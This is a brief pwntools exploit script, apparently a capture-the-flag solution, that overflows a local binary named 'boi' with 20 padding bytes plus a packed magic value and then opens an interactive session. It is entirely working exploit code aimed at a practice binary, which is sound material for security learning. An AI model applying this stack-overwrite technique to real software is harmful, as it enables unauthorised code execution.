from pwn import *

p = process('./boi')

goal = 0xcaf3baee

payload = b"A"*20
payload += p64(goal)

p.sendline(payload)

p.interactive()
